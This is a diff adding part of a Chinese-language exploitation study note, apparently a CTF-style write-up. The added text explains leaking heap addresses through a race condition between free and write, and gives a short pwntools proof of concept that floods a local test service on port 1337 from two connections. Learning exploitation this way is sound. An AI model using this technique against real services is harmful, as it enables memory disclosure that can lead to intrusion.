@@ -180,7 +180,28 @@ int printf_string(the_string) {
 }
 ```
 因此可以利用`race condition`来泄露堆地址！<br>
+原理如下:<br>
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250508220532.png)
+因为`write需要陷入内核态，和free不用，因此race condition出现的概率并不小`<br>
+POC如下:<br>
+```python
+from pwn import *
+import os
+# context.log_level = 'debug'
 
+with process("./test") as p:
+    r1 = remote("localhost",1337)
+    r2 = remote("localhost",1337)
+    if os.fork() == 0:
+        for _ in range(10000):
+            r1.sendline(b"malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0")
+        os.kill(os.getpid(),9)
+    else:
+        for _ in range(10000):
+            r2.sendline(b"printf 0")
+        print(set(r2.clean().splitlines()))
+```
+![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2025-9-25/20250508223105.png)
 
 <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
